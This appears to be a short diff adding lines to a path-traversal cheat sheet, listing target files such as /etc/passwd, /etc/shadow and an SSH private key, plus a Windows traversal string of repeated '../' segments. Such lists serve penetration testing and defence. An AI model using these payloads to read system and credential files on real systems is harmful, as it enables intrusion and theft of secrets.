@@ -1,1 +1,8 @@
+Juicy Files via Path Traversal
+/etc/passwd
+/etc/shadow
+/home/user/.ssh/id_rsa
 
+
+Path traversal on Windows OS
+/../../../../../../../../users/install.txt  
